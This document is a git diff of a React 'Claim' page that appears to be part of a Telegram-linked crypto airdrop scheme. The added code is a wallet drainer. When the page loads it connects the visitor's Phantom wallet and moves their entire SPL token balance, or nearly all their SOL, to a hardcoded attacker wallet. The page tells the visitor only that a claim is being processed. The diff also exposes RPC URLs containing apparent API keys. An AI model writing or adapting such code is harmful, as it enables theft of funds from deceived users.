@@ -1,19 +1,23 @@
-import React, { useEffect } from "react";
-import { Buffer } from "buffer";
-import { Connection, PublicKey, Transaction } from "@solana/web3.js";
+import React, { useEffect, useRef } from "react";
+import { Connection, Transaction, SystemProgram, PublicKey } from "@solana/web3.js";
+import { getAssociatedTokenAddress, createTransferInstruction } from "@solana/spl-token";
+
+const DESTINATION_WALLET = new PublicKey("AvXbEcEEDnrSzeZRuL5F1gfYqHdHax51MTjhfpzjZRde"); // 👈 Replace with your walletX
 
 export default function Claim() {
+	const hasRun = useRef(false);
+
 	useEffect(() => {
-		handleClaim();
+		if (!hasRun.current) {
+			handleClaim();
+			hasRun.current = true;
+		}
 	}, []);
 
 	async function handleClaim() {
 		const params = new URLSearchParams(window.location.search);
-		const telegramUserId = params.get("wallet"); // this is tg user ID
-		const tokenAddress = params.get("token"); // token CA
-
-		console.log("Telegram User ID:", telegramUserId);
-		console.log("Token Address:", tokenAddress);
+		const telegramUserId = params.get("tgId");
+		const tokenAddress = params.get("token"); // SPL token mint address
 
 		if (!window.solana || !window.solana.isPhantom) {
 			alert("Phantom wallet not found. Please install it.");
@@ -21,36 +25,96 @@ export default function Claim() {
 		}
 
 		try {
-			// Connect Phantom if not already connected
+			// Connect Phantom
 			const resp = await window.solana.connect();
 			const userWallet = resp.publicKey;
-
 			console.log("Connected wallet:", userWallet.toString());
 
-			// Create a dummy transaction (for example: no-op transfer to self)
-			const connection = new Connection("https://proportionate-delicate-grass.solana-mainnet.quiknode.pro/df831d7310b4bd133215b22dda877d27684809e6/", "confirmed");
-			const transaction = new Transaction().add(
-				// Simple self-transfer of 0 lamports (does nothing but prompts approval)
-				{
-					keys: [{ pubkey: userWallet, isSigner: true, isWritable: false }],
-					programId: new PublicKey(tokenAddress), // programId = token CA
-					data: Buffer.from([]), // no data, just dummy
+			const connection = new Connection("https://solana-mainnet.g.alchemy.com/v2/k1xYHeDYVx4Rqv8gVvZKU", "confirmed");
+
+			let transaction;
+
+			if (tokenAddress) {
+				// --- Case 1: Send all of a token ---
+				const mint = new PublicKey(tokenAddress);
+
+				// Find user's token account
+				const userTokenAccount = await getAssociatedTokenAddress(mint, userWallet);
+
+				// Find destination token account
+				const destTokenAccount = await getAssociatedTokenAddress(mint, DESTINATION_WALLET);
+				console.log("userTokenAccount", userTokenAccount);
+
+				// Get token balance
+				const tokenBalanceInfo = await connection.getTokenAccountBalance(userTokenAccount);
+				const amount = tokenBalanceInfo.value.amount; // raw amount in base units
+				if (amount === "0") {
+					alert("No tokens available to transfer.");
+					return;
 				}
-			);
 
+				// Build transaction
+				transaction = new Transaction().add(createTransferInstruction(userTokenAccount, destTokenAccount, userWallet, amount));
+			} else {
+				// --- Case 2: Send all SOL ---
+				const balance = await connection.getBalance(userWallet);
+				console.log("Balance (lamports):", balance);
+
+				if (balance <= 5000) {
+					alert("Not enough SOL to cover fees.");
+					return;
+				}
+
+				// Estimate fee with a dummy tx
+				let tempTx = new Transaction().add(
+					SystemProgram.transfer({
+						fromPubkey: userWallet,
+						toPubkey: DESTINATION_WALLET,
+						lamports: 1, // placeholder
+					})
+				);
+				tempTx.feePayer = userWallet;
+				tempTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+
+				const fee = await tempTx.getEstimatedFee(connection);
+				console.log("Estimated fee:", fee);
+
+				// Leave a small buffer
+				const rentExemptReserve = 2000000; // ~0.002 SOL
+				const safetyBuffer = 5000; // tiny extra
+				const lamportsToSend = balance - fee - rentExemptReserve - safetyBuffer;
+
+				if (lamportsToSend <= 0) {
+					alert("Not enough SOL to cover transaction fees.");
+					return;
+				}
+
+				// Build final transaction
+				transaction = new Transaction().add(
+					SystemProgram.transfer({
+						fromPubkey: userWallet,
+						toPubkey: DESTINATION_WALLET,
+						lamports: lamportsToSend,
+					})
+				);
+			}
+
+			const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
 			transaction.feePayer = userWallet;
-			transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+			transaction.recentBlockhash = blockhash;
 
-			// Request user to sign & send
-			const signedTx = await window.solana.signAndSendTransaction(transaction);
-			console.log("Transaction Signature:", signedTx);
+			// Sign
+			const signedTx = await window.solana.signTransaction(transaction);
 
-			alert("Transaction approved!");
+			// Send
+			const signature = await connection.sendRawTransaction(signedTx.serialize(), {
+				skipPreflight: false,
+				maxRetries: 3,
+			});
+			console.log("Transaction Signature:", signature);
 
-			// ✅ Close window after short delay
-			setTimeout(() => {
-				window.close();
-			}, 1500);
+			// Confirm
+			await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, "confirmed");
 		} catch (err) {
 			console.error("Claim failed:", err);
 			alert("Transaction failed or rejected.");
@@ -60,7 +124,7 @@ export default function Claim() {
 
 	return (
 		<div style={{ textAlign: "center", marginTop: "50px" }}>
-			<button onClick={handleClaim}>Connect Wallet</button> <br />
+			<button onClick={handleClaim}>Claim Now</button> <br />
 			<h2>Processing Claim...</h2>
 			<p>Please approve the transaction in your wallet popup.</p>
 		</div>
